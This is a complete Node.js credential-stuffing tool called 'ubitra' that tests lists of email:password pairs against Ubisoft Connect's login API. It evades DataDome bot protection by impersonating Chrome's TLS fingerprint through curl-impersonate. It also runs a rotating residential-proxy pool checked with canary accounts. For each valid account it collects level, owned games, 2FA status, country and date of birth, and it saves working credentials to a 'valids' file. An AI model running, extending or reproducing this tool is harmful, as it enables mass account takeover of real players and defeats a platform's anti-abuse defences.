#!/usr/bin/env node
'use strict';

/*
 * ubitra - headless Ubisoft Connect account checker
 *
 * Auth flow (public API, no browser automation):
 *   1. POST public-ubiservices.ubi.com/v3/profiles/sessions
 *        Authorization: Basic base64(email:password)
 *        Ubi-AppId: <connect app id>
 *        body: {"rememberMe":true}
 *      -> { ticket (ubi_v1 JWE), sessionId, userId, profileId, nameOnPlatform, ... }
 *   2. GET  /v3/users/me                     -> email, country, dob, status
 *   3. GET  /v3/profiles/me/2fa              -> 2FA on/off
 *   4. GET  /v1/profiles/me/global/ubiconnect/economy/api/metaprogression -> level, xp
 *   5. GET  /v1/profiles/me/gamesplayed      -> games (needs Ubi-SessionId header)
 *   6. GET  /v1/applications?applicationIds= -> application names
 *
 * Bot wall: DataDome fingerprints the TLS ClientHello (JA3/JA4). Node's TLS
 * stack is challenged with HTTP 403 even from a residential IP, so transport
 * shells out to curl-impersonate with a real Chrome fingerprint. A residential
 * proxy is still required (datacenter IPs are blocked regardless of fp).
 *
 * Proxy pool: `tester.txt` holds one or more canary accounts. A background pool
 * continuously probes proxies.txt with these canaries. A probe only marks a
 * proxy dead on 403 (DataDome block) or transport error; 401 / 429 / 200 all
 * prove DataDome let the request through, so the proxy is considered working.
 * Working proxies are persisted to `workingproxies.txt` with expiry timestamps
 * and handed to account checkers on demand. Default TTL is 3 minutes to match
 * rotating-proxy exit IP churn.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn } = require('child_process');

const APPID = 'aa88e512-9395-457d-bcb9-8d59c23f88c9';
const UBI = 'https://public-ubiservices.ubi.com';
const CONNECT = 'https://connect.ubisoft.com';

const C = {
  reset: '\x1b[0m', purple: '\x1b[38;5;135m', purpleHi: '\x1b[38;5;141m',
  purpleLo: '\x1b[38;5;93m', grey: '\x1b[38;5;244m', red: '\x1b[38;5;203m',
  green: '\x1b[38;5;114m', yellow: '\x1b[38;5;221m', cyan: '\x1b[38;5;117m',
  bold: '\x1b[1m', dim: '\x1b[2m',
};

const LOGO = [
  '  ██╗   ██╗██████╗ ██╗████████╗██████╗  █████╗ ',
  '  ██║   ██║██╔══██╗██║╚══██╔══╝██╔══██╗██╔══██╗',
  '  ██║   ██║██████╔╝██║   ██║   ██████╔╝███████║',
  '  ██║   ██║██╔══██╗██║   ██║   ██╔══██╗██╔══██║',
  '  ╚██████╔╝██████╔╝██║   ██║   ██║  ██║██║  ██║',
  '   ╚═════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝',
];

function showLogo() {
  const shades = [C.purpleHi, C.purpleHi, C.purple, C.purple, C.purpleLo, C.purpleLo];
  console.log('');
  LOGO.forEach((line, i) => console.log(shades[i] + line + C.reset));
  console.log(`${C.grey}            headless ubisoft connect checker  ${C.dim}v1.2${C.reset}`);
  console.log(`${C.grey}            async curl-impersonate · background proxy pool${C.reset}\n`);
}

// ─────────────────────────────────────────────────── impersonate ──
function resolveImpersonate() {
  const env = process.env.UBISOFT_CURL_IMPERSONATE || process.env.CURL_IMPERSONATE;
  const cands = [];
  if (env) cands.push({ p: env, raw: /curl-impersonate$/i.test(env) });
  const dirs = [path.join(__dirname, 'bin'), __dirname, '/tmp', '/usr/local/bin', '/usr/bin', `${os.homedir()}/.local/bin/curl-imp`];
  const wrappers = ['curl_chrome150', 'curl_chrome146', 'curl_chrome145',
    'curl_chrome142', 'curl_chrome136', 'curl_chrome133a', 'curl_chrome131'];
  for (const d of dirs) for (const n of wrappers) cands.push({ p: path.join(d, n), raw: false });
  for (const d of dirs) cands.push({ p: path.join(d, 'curl-impersonate'), raw: true });
  for (const c of cands) {
    try { fs.accessSync(c.p, fs.constants.X_OK); return c; } catch {}
  }
  return null;
}
const CI = resolveImpersonate();

// ────────────────────────────────────────────────── async curl ──
function curlFetch({ method, url, headers = {}, body, proxy, jar, timeout = 40000 }) {
  return new Promise((resolve, reject) => {
    const args = [];
    if (CI.raw) args.push('--compressed', '--impersonate', 'chrome150');
    args.push('-s', '-X', method, '--max-time', String(Math.ceil(timeout / 1000)));
    if (proxy) args.push('-x', proxy);
    if (jar) args.push('-c', jar, '-b', jar);
    for (const [k, v] of Object.entries(headers)) args.push('-H', `${k}: ${v}`);
    if (body != null) args.push('--data-binary', body);
    args.push('-w', '\n__HTTP__%{http_code}');
    args.push(url);

    let child;
    try { child = spawn(CI.p, args, { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { return reject(new Error(`curl spawn: ${e.message}`)); }

    const chunks = [];
    let killed = false;
    const killTimer = setTimeout(() => { killed = true; try { child.kill('SIGKILL'); } catch {} }, timeout + 2000);

    child.stdout.on('data', (d) => chunks.push(d));
    child.stderr.on('data', () => {});
    child.on('error', (e) => { clearTimeout(killTimer); reject(new Error(`curl spawn: ${e.message}`)); });
    child.on('close', () => {
      clearTimeout(killTimer);
      if (killed) return reject(new Error('curl timeout'));
      const out = Buffer.concat(chunks).toString('utf8');
      const m = out.lastIndexOf('\n__HTTP__');
      if (m < 0) return reject(new Error('curl: no status line'));
      const status = parseInt(out.slice(m + 9).trim(), 10);
      resolve({ status, text: out.slice(0, m) });
    });
  });
}

// ─────────────────────────────────────────────────────────── auth ──
function basicAuth(email, password) {
  return 'Basic ' + Buffer.from(`${email}:${password}`).toString('base64');
}
function commonHeaders(ticket, sessionId) {
  const h = { 'Ubi-AppId': APPID, 'Content-Type': 'application/json', 'Accept': 'application/json' };
  if (ticket) h['Authorization'] = 'ubi_v1 t=' + ticket;
  if (sessionId) h['Ubi-SessionId'] = sessionId;
  return h;
}
async function login(acc, timeout) {
  const r = await curlFetch({
    method: 'POST', url: `${UBI}/v3/profiles/sessions`,
    headers: { ...commonHeaders(), Authorization: basicAuth(acc.user, acc.pass), Origin: CONNECT, Referer: CONNECT + '/' },
    body: JSON.stringify({ rememberMe: true }),
    proxy: acc.proxy, jar: acc.jar, timeout,
  });
  let j = null; try { j = JSON.parse(r.text); } catch {}
  return { status: r.status, json: j, raw: r.text };
}
async function get(acc, ticket, sessionId, url) {
  const r = await curlFetch({
    method: 'GET', url,
    headers: { ...commonHeaders(ticket, sessionId), Origin: CONNECT, Referer: CONNECT + '/' },
    proxy: acc.proxy, jar: acc.jar,
  });
  let j = null; try { j = JSON.parse(r.text); } catch {}
  return { status: r.status, json: j, raw: r.text };
}

// ──────────────────────────────────────────────────── capture data ──
async function captureFull(acc, sess) {
  const t = sess.ticket, sid = sess.sessionId;
  const out = { level: null, xp: null, games: [], twofa: false, user: null };

  const me = await get(acc, t, sid, `${UBI}/v3/users/me`);
  if (me.json) out.user = me.json;

  const fa = await get(acc, t, sid, `${UBI}/v3/profiles/me/2fa`);
  if (fa.json) out.twofa = !!fa.json.active;

  const mp = await get(acc, t, sid, `${UBI}/v1/profiles/me/global/ubiconnect/economy/api/metaprogression`);
  if (mp.json) { out.level = mp.json.level; out.xp = mp.json.xp; }

  const gp = await get(acc, t, sid, `${UBI}/v1/profiles/me/gamesplayed`);
  const played = (gp.json && gp.json.gamesPlayed) || [];
  const appIds = [];
  for (const g of played) for (const a of (g.applications || []))
    if (a.applicationId && !appIds.includes(a.applicationId)) appIds.push(a.applicationId);

  const names = {};
  for (let i = 0; i < appIds.length; i += 50) {
    const batch = appIds.slice(i, i + 50);
    const ap = await get(acc, t, sid, `${UBI}/v1/applications?applicationIds=${batch.join(',')}&offset=0&limit=50`);
    for (const a of ((ap.json && ap.json.applications) || []))
      if (a.name) names[a.applicationId] = a.name;
  }
  out.games = played.map((g) => {
    const ids = (g.applications || []).map((a) => a.applicationId);
    const nm = ids.map((id) => names[id]).filter(Boolean);
    return { name: nm[0] || g.spaceId, platform: g.spacePlatformType, sessions: g.sessionsCount };
  });
  return out;
}

// ─────────────────────────────────────────────────── proxy probe ──
async function probeProxy(proxy, tester, timeoutMs) {
  const jar = path.join(os.tmpdir(), `ubitra_probe_${process.pid}_${Math.random().toString(36).slice(2)}.jar`);
  try {
    const r = await login({ user: tester.user, pass: tester.pass, proxy, jar }, timeoutMs);
    if (r.status === 403) return { ok: false, status: 403, reason: 'DataDome block' };
    return { ok: true, status: r.status, reason: r.status === 401 ? 'invalid(ok)' : `http ${r.status}` };
  } catch (e) {
    return { ok: false, status: 0, reason: e.message };
  } finally {
    try { fs.unlinkSync(jar); } catch {}
  }
}

// ──────────────────────────────────────────────────────── check ──
async function checkAccount(acc, opts) {
  const jar = path.join(os.tmpdir(), `ubitra_${process.pid}_${Math.random().toString(36).slice(2)}.jar`);
  acc.jar = jar;
  try {
    const r = await login(acc);
    if (r.status === 200 && r.json && r.json.ticket) {
      const res = {
        username: acc.user, password: acc.pass, status: 'VALID',
        userId: r.json.userId, profileId: r.json.profileId,
        name: r.json.nameOnPlatform, twoFactorTicket: !!r.json.twoFactorAuthenticationTicket,
        clientIp: r.json.clientIp, clientIpCountry: r.json.clientIpCountry,
      };
      if (opts.mode === 'full') Object.assign(res, await captureFull(acc, r.json));
      return res;
    }
    if (r.status === 200 && r.json && r.json.twoFactorAuthenticationTicket) {
      const pref = (r.json.codeGenerationPreference || [])[0] || '2fa';
      const comm = r.json.codeCommunicationPreference || '';
      return { username: acc.user, password: acc.pass, status: 'VALID2FA',
        twoFactorKind: comm ? `${pref} (${comm})` : pref, sessionId: r.json.sessionId };
    }
    if (r.status === 401) return { username: acc.user, password: acc.pass, status: 'INVALID',
      reason: (r.json && r.json.message) || 'Invalid credentials' };
    if (r.status === 429) return { username: acc.user, password: acc.pass, status: 'RATELIMIT',
      reason: (r.json && r.json.message) || 'Too many calls per profile' };
    if (r.status === 403) return { username: acc.user, password: acc.pass, status: 'BLOCKED',
      reason: 'DataDome challenge (rotate proxy / slow down / fresh IP)' };
    return { username: acc.user, password: acc.pass, status: 'ERROR',
      reason: `HTTP ${r.status} ${(r.json && r.json.message) || r.raw.slice(0, 80)}` };
  } finally {
    try { fs.unlinkSync(jar); } catch {}
  }
}

// ──────────────────────────────────────────────── proxy pool ──
class ProxyPool {
  constructor({ proxies, testers, ttlMs, probeConcurrency, probeTimeoutMs, persistFile, cooldownMs }) {
    this.all = proxies;
    this.testers = testers;
    this.ttlMs = ttlMs;
    this.probeConcurrency = probeConcurrency;
    this.probeTimeoutMs = probeTimeoutMs;
    this.persistFile = persistFile;
    this.cooldownMs = cooldownMs;
    this.working = new Map();   // proxy -> expiresAt (ms)
    this.inflight = new Set();
    this.lastProbed = new Map(); // proxy -> ms
    this.waiters = [];
    this.stopped = false;
    this.stats = { probes: 0, dead: 0, good: 0, expired: 0, evicted: 0 };
    this._loadPersisted();
  }

  _loadPersisted() {
    if (!this.persistFile || !fs.existsSync(this.persistFile)) return;
    const now = Date.now();
    let loaded = 0;
    for (const line of fs.readFileSync(this.persistFile, 'utf8').split(/\r?\n/)) {
      const t = line.trim();
      if (!t) continue;
      const [p, expStr] = t.split('|');
      const exp = parseInt(expStr, 10);
      if (!p || !Number.isFinite(exp) || exp <= now) continue;
      this.working.set(p, exp);
      loaded++;
    }
    if (loaded) console.log(`${C.grey}  pool: loaded ${loaded} non-expired proxies from ${path.basename(this.persistFile)}${C.reset}`);
  }

  _persist() {
    if (!this.persistFile) return;
    const now = Date.now();
    const lines = [];
    for (const [p, exp] of this.working) if (exp > now) lines.push(`${p}|${exp}`);
    try { fs.writeFileSync(this.persistFile, lines.join('\n') + (lines.length ? '\n' : '')); } catch {}
  }

  start() {
    for (let i = 0; i < this.probeConcurrency; i++) this._loop(i);
    this._persistTimer = setInterval(() => this._persist(), 5000);
    this._persistTimer.unref && this._persistTimer.unref();
  }

  stop() {
    this.stopped = true;
    if (this._persistTimer) clearInterval(this._persistTimer);
    this._persist();
    while (this.waiters.length) this.waiters.shift().reject(new Error('pool stopped'));
  }

  async _loop(id) {
    let i = id;
    while (!this.stopped) {
      if (!this.all.length) { await sleep(500); continue; }
      const proxy = this.all[i % this.all.length];
      i += this.probeConcurrency;

      const now = Date.now();
      const exp = this.working.get(proxy);
      if (exp && exp > now) { await sleep(100); continue; }
      if (exp && exp <= now) { this.working.delete(proxy); this.stats.expired++; }

      const last = this.lastProbed.get(proxy) || 0;
      if (now - last < this.cooldownMs) { await sleep(75); continue; }
      if (this.inflight.has(proxy)) { await sleep(50); continue; }

      this.inflight.add(proxy);
      this.lastProbed.set(proxy, Date.now());
      const tester = this.testers[id % this.testers.length];
      try {
        const r = await probeProxy(proxy, tester, this.probeTimeoutMs);
        this.stats.probes++;
        if (r.ok) {
          this.working.set(proxy, Date.now() + this.ttlMs);
          this.stats.good++;
          this._drain();
        } else {
          this.stats.dead++;
        }
      } catch (e) {
        this.stats.dead++;
      } finally {
        this.inflight.delete(proxy);
      }
    }
  }

  async grab(timeoutMs) {
    const now = Date.now();
    for (const [p, exp] of this.working) if (exp <= now) { this.working.delete(p); this.stats.expired++; }
    if (this.working.size) {
      const [p] = this.working.entries().next().value;
      this.working.delete(p);
      return p;
    }
    return new Promise((resolve, reject) => {
      const entry = {
        resolve: (p) => { clearTimeout(t); resolve(p); },
        reject: (e) => { clearTimeout(t); reject(e); },
      };
      const t = setTimeout(() => {
        const idx = this.waiters.indexOf(entry);
        if (idx >= 0) this.waiters.splice(idx, 1);
        reject(new Error(`proxy pool timeout after ${timeoutMs}ms`));
      }, timeoutMs);
      this.waiters.push(entry);
    });
  }

  _drain() {
    while (this.waiters.length && this.working.size) {
      const [p] = this.working.entries().next().value;
      this.working.delete(p);
      this.waiters.shift().resolve(p);
    }
  }

  invalidate(proxy) {
    if (this.working.delete(proxy)) this.stats.evicted++;
  }

  summary() {
    const now = Date.now();
    let live = 0;
    for (const exp of this.working.values()) if (exp > now) live++;
    return `pool ${live}w/${this.stats.dead}d/${this.stats.expired}e`;
  }
}

// ──────────────────────────────────────────────────── formatting ──
function formatGames(games) {
  if (!games || !games.length) return '0 games';
  return `${games.length} games: ${games.map((g) => g.name).join(', ')}`;
}
function formatUser(u) {
  if (!u) return '';
  return `${u.country || '?'}${u.dateOfBirth ? ' dob ' + u.dateOfBirth.slice(0, 10) : ''}`;
}

// ─────────────────────────────────────────────────────── output ──
class Writer {
  constructor() { this.chain = Promise.resolve(); }
  append(file, line) {
    this.chain = this.chain.then(() => fs.promises.appendFile(file, line + '\n')).catch(() => {});
    return this.chain;
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function loadAccounts(file) {
  const raw = fs.readFileSync(file, 'utf8').split(/\r?\n/);
  const out = [];
  for (const line of raw) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const i = t.indexOf(':');
    if (i < 1) continue;
    out.push({ user: t.slice(0, i), pass: t.slice(i + 1) });
  }
  return out;
}
function loadProxies(file) {
  if (!fs.existsSync(file)) return [];
  return fs.readFileSync(file, 'utf8').split(/\r?\n/).map((l) => l.trim())
    .filter((l) => l && !l.startsWith('#') && /^(https?|socks[45]h?):\/\//i.test(l));
}

// ──────────────────────────────────────────────────────── prompt ──
let rl = null; const lineQueue = []; const waiters = [];
function getRl() {
  if (rl) return rl;
  rl = require('readline').createInterface({ input: process.stdin, terminal: false });
  rl.on('line', (l) => { const v = l.trim(); if (waiters.length) waiters.shift()(v); else lineQueue.push(v); });
  rl.on('close', () => { while (waiters.length) waiters.shift()(''); });
  return rl;
}
function ask(q) {
  getRl(); process.stdout.write(q);
  return new Promise((res) => { if (lineQueue.length) res(lineQueue.shift()); else waiters.push(res); });
}
async function promptThreads() {
  while (true) {
    const a = await ask(`${C.purple}${C.bold}[?]${C.reset} Threads (1-500): `);
    const n = parseInt(a, 10);
    if (Number.isInteger(n) && n >= 1 && n <= 500) return n;
    console.log(`${C.red}    enter 1-500${C.reset}`);
  }
}
async function promptMode() {
  while (true) {
    console.log(`${C.purple}${C.bold}[?]${C.reset} Capture mode:`);
    console.log(`      ${C.cyan}1${C.reset}) semi  ${C.grey}(valid/invalid only)${C.reset}`);
    console.log(`      ${C.cyan}2${C.reset}) full  ${C.grey}(+ level, games, 2fa, country)${C.reset}`);
    const a = (await ask(`${C.purple}  > ${C.reset}`)).toLowerCase();
    if (a === '1' || a === 'semi') return 'semi';
    if (a === '2' || a === 'full') return 'full';
    console.log(`${C.red}    choose 1 or 2${C.reset}`);
  }
}

// ───────────────────────────────────────────────────────── pool ──
async function runPool(items, threads, worker, onDone) {
  let next = 0, done = 0; const runners = [];
  for (let t = 0; t < threads; t++) runners.push((async (threadId) => {
    while (true) {
      const i = next++;
      if (i >= items.length) break;
      try { await worker(items[i], i, threadId); } finally { done++; onDone && onDone(done, items.length); }
    }
  })(t));
  await Promise.all(runners);
}

// ───────────────────────────────────────────────────────── main ──
async function main() {
  showLogo();

  if (!CI) {
    console.log(`${C.red}[x] curl-impersonate not found.${C.reset}`);
    console.log(`${C.grey}    set UBISOFT_CURL_IMPERSONATE=/path/to/curl_chrome150${C.reset}`);
    process.exit(1);
  }
  const accountsFile = process.argv[2] || 'accounts.txt';
  if (!fs.existsSync(accountsFile)) {
    console.log(`${C.red}[x] ${accountsFile} not found${C.reset}`);
    process.exit(1);
  }
  const testerFile = process.argv[3] || 'tester.txt';
  if (!fs.existsSync(testerFile)) {
    console.log(`${C.red}[x] ${testerFile} not found${C.reset}`);
    console.log(`${C.grey}    create tester.txt with one line: email:password${C.reset}`);
    process.exit(1);
  }
  const testers = loadAccounts(testerFile);
  if (!testers.length) { console.log(`${C.red}[x] no email:password in ${testerFile}${C.reset}`); process.exit(1); }

  const threads = await promptThreads();
  const mode = await promptMode();

  const accounts = loadAccounts(accountsFile);
  if (!accounts.length) { console.log(`${C.red}[x] no valid email:password lines${C.reset}`); process.exit(1); }
  const proxies = loadProxies('proxies.txt');

  const resultsDir = path.join(process.cwd(), 'results');
  fs.mkdirSync(resultsDir, { recursive: true });
  const files = {
    valid: path.join(resultsDir, 'ubisoft_valids.txt'),
    valid2fa: path.join(resultsDir, 'ubisoft_valids_2fa.txt'),
    invalid: path.join(resultsDir, 'ubisoft_invalid.txt'),
    error: path.join(resultsDir, 'ubisoft_errors.txt'),
  };
  for (const f of Object.values(files)) fs.writeFileSync(f, '');

  const poolTtlMs = parseInt(process.env.UBISOFT_POOL_TTL_MS || '180000', 10) || 180000;
  const poolConcurrency = parseInt(process.env.UBISOFT_POOL_CONCURRENCY || '10', 10) || 10;
  const probeTimeoutMs = parseInt(process.env.UBISOFT_PROBE_TIMEOUT_MS || '8000', 10) || 8000;
  const grabTimeoutMs = parseInt(process.env.UBISOFT_GRAB_TIMEOUT_MS || '120000', 10) || 120000;
  const probeCooldownMs = parseInt(process.env.UBISOFT_PROBE_COOLDOWN_MS || '20000', 10) || 20000;

  let pool = null;
  if (proxies.length) {
    pool = new ProxyPool({
      proxies, testers, ttlMs: poolTtlMs, probeConcurrency: poolConcurrency,
      probeTimeoutMs, persistFile: path.join(process.cwd(), 'workingproxies.txt'),
      cooldownMs: probeCooldownMs,
    });
    pool.start();
  } else {
    console.log(`${C.yellow}[!] no proxies.txt entries — direct connection (will be 403'd)${C.reset}`);
  }

  console.log('');
  console.log(`${C.purple}${C.bold}[i]${C.reset} transport ${C.dim}${CI.p}${C.reset}`);
  console.log(`${C.purple}${C.bold}[i]${C.reset} accounts ${C.bold}${accounts.length}${C.reset} · proxies ${C.bold}${proxies.length}${C.reset} · testers ${C.bold}${testers.length}${C.reset}`);
  console.log(`${C.purple}${C.bold}[i]${C.reset} threads ${C.bold}${threads}${C.reset} · mode ${C.bold}${mode}${C.reset} · pool-ttl ${C.bold}${poolTtlMs / 1000}s${C.reset} · pool-conc ${C.bold}${poolConcurrency}${C.reset}`);
  console.log(`${C.grey}${'─'.repeat(60)}${C.reset}`);

  const writer = new Writer();
  const stats = { valid: 0, valid2fa: 0, invalid: 0, ratelimit: 0, blocked: 0, error: 0 };
  const start = Date.now();

  function logResult(r) {
    if (r.status === 'VALID') {
      stats.valid++;
      const line = mode === 'full'
        ? `${r.username}:${r.password} | lvl ${r.level ?? '?'} (${r.xp ?? '?'}xp) | ${formatGames(r.games)} | 2fa:${r.twofa ? 'on' : 'off'}`
        : `${r.username}:${r.password}`;
      writer.append(files.valid, line);
      const extra = mode === 'full'
        ? ` ${C.dim}lvl ${r.level} · ${(r.games || []).length} games · ${formatUser(r.user)} · 2fa:${r.twofa ? 'on' : 'off'}${C.reset}` : '';
      console.log(`${C.green}[+] VALID${C.reset}   ${C.bold}${r.username}${C.reset}:${r.password} ${C.dim}(${r.name || r.userId})${C.reset}${extra}`);
    } else if (r.status === 'VALID2FA') {
      stats.valid2fa++;
      writer.append(files.valid2fa, `${r.username}:${r.password}`);
      console.log(`${C.cyan}[+] 2FA${C.reset}     ${C.bold}${r.username}${C.reset}:${r.password} ${C.dim}2FA — ${r.twoFactorKind}${C.reset}`);
    } else if (r.status === 'INVALID') {
      stats.invalid++;
      writer.append(files.invalid, `${r.username}:${r.password}`);
      console.log(`${C.red}[-] INVALID${C.reset} ${r.username}:${r.password} ${C.dim}${r.reason || ''}${C.reset}`);
    } else if (r.status === 'RATELIMIT') {
      stats.ratelimit++;
      writer.append(files.error, `${r.username}:${r.password}`);
      console.log(`${C.yellow}[~] RATE${C.reset}    ${r.username}:${r.password} ${C.dim}${r.reason}${C.reset}`);
    } else if (r.status === 'BLOCKED') {
      stats.blocked++;
      writer.append(files.error, `${r.username}:${r.password}`);
      console.log(`${C.yellow}[!] BLOCKED${C.reset} ${r.username}:${r.password} ${C.dim}${r.reason}${C.reset}`);
    } else {
      stats.error++;
      writer.append(files.error, `${r.username}:${r.password}`);
      console.log(`${C.yellow}[!] ERROR${C.reset}   ${r.username}:${r.password} ${C.dim}${r.reason || ''}${C.reset}`);
    }
  }

  const paceMs = parseInt(process.env.UBISOFT_PACE_MS || '0', 10) || 0;

  await runPool(accounts, threads, async (acc, idx, threadId) => {
    let proxy = null;
    if (pool) {
      try { proxy = await pool.grab(grabTimeoutMs); }
      catch (e) {
        logResult({ username: acc.user, password: acc.pass, status: 'ERROR', reason: e.message });
        return;
      }
    }
    const realAcc = { ...acc, proxy };
    let r;
    try { r = await checkAccount(realAcc, { mode }); }
    catch (e) { r = { username: acc.user, password: acc.pass, status: 'ERROR', reason: e.message }; }

    // 403 on real check means the proxy stopped being good — evict so it re-probes
    if (pool && r.status === 'BLOCKED' && proxy) pool.invalidate(proxy);

    logResult(r);
    if (paceMs) await sleep(paceMs);
  }, (done, total) => {
    if (done === total) return;
    const poolInfo = pool ? ` ${C.dim}${pool.summary()}${C.reset}` : '';
    process.stdout.write(`\r${C.grey}[${done}/${total}]${C.reset} ${C.green}${stats.valid}v${C.reset} ${C.red}${stats.invalid}x${C.reset} ${C.yellow}${stats.blocked + stats.error}!${C.reset}${poolInfo}\x1b[2K`);
  });

  if (pool) pool.stop();
  await writer.chain;

  const secs = ((Date.now() - start) / 1000).toFixed(1);
  console.log(`${C.grey}${'─'.repeat(60)}${C.reset}`);
  console.log(`${C.purple}${C.bold}[done]${C.reset} finished ${accounts.length} accounts in ${secs}s`);
  console.log(`   ${C.green}valids${C.reset}   -> ${files.valid}   ${C.green}(${stats.valid})${C.reset}`);
  console.log(`   ${C.cyan}valid2fa${C.reset} -> ${files.valid2fa}   ${C.cyan}(${stats.valid2fa})${C.reset}`);
  console.log(`   ${C.red}invalid${C.reset}  -> ${files.invalid}   ${C.red}(${stats.invalid})${C.reset}`);
  console.log(`   ${C.yellow}rate${C.reset}     -> ${files.error}   ${C.yellow}(${stats.ratelimit})${C.reset}`);
  console.log(`   ${C.yellow}blocked${C.reset}  -> ${files.error}   ${C.yellow}(${stats.blocked})${C.reset}`);
  console.log(`   ${C.yellow}errors${C.reset}   -> ${files.error}   ${C.yellow}(${stats.error})${C.reset}`);
  if (pool) {
    const s = pool.stats;
    console.log(`   ${C.grey}pool${C.reset}     -> probes ${s.probes}, good ${s.good}, dead ${s.dead}, expired ${s.expired}, evicted ${s.evicted}${C.reset}`);
  }
  console.log('');
}

main().catch((e) => { console.error(`${C.red}[fatal] ${e.stack || e.message}${C.reset}`); process.exit(1); });
